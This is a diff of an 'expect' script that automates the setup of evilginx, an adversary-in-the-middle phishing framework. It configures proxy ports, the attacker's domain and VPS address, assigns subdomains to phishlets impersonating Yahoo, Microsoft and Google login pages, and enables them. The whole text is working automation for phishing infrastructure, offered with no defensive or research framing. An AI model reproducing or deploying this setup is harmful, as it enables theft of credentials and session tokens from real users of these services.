@@ -627,24 +627,34 @@ spawn /usr/local/bin/evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets
 expect {
     "blacklist: loaded" {
         # Engine is initialized and database is ready for commands
-        expect -re ">"
+        expect -re "evilginx\s+>\s*$"
         
+        send "config proxy https_port 8443\r"
+        expect -re "evilginx\s+>\s*$"
+        send "config proxy http_port 8081\r"
+        expect -re "evilginx\s+>\s*$"
+        send "config proxy dns_port 0\r"
+        expect -re "evilginx\s+>\s*$"
+        send "config proxy autocert off\r"
+        expect -re "evilginx\s+>\s*$"
         send "config domain $DOMAIN\r"
-        expect -re ">"
+        expect -re "evilginx\s+>\s*$"
         send "config ipv4 external $VPS_IP\r"
-        expect -re ">"
-        send "config https_port 8443\r"
-        expect -re ">"
-        send "config dns_port 0\r"
-        expect -re ">"
+        expect -re "evilginx\s+>\s*$"
         
         # Enable phishlets
         send "phishlets hostname yahoo $EP1.$DOMAIN\r"
-        expect -re ">"
+        expect -re "evilginx\s+>\s*$"
+        send "phishlets enable yahoo\r"
+        expect -re "evilginx\s+>\s*$"
         send "phishlets hostname microsoft $EP2.$DOMAIN\r"
-        expect -re ">"
+        expect -re "evilginx\s+>\s*$"
+        send "phishlets enable microsoft\r"
+        expect -re "evilginx\s+>\s*$"
         send "phishlets hostname google $EP3.$DOMAIN\r"
-        expect -re ">"
+        expect -re "evilginx\s+>\s*$"
+        send "phishlets enable google\r"
+        expect -re "evilginx\s+>\s*$"
         
         send "exit\r"
     }
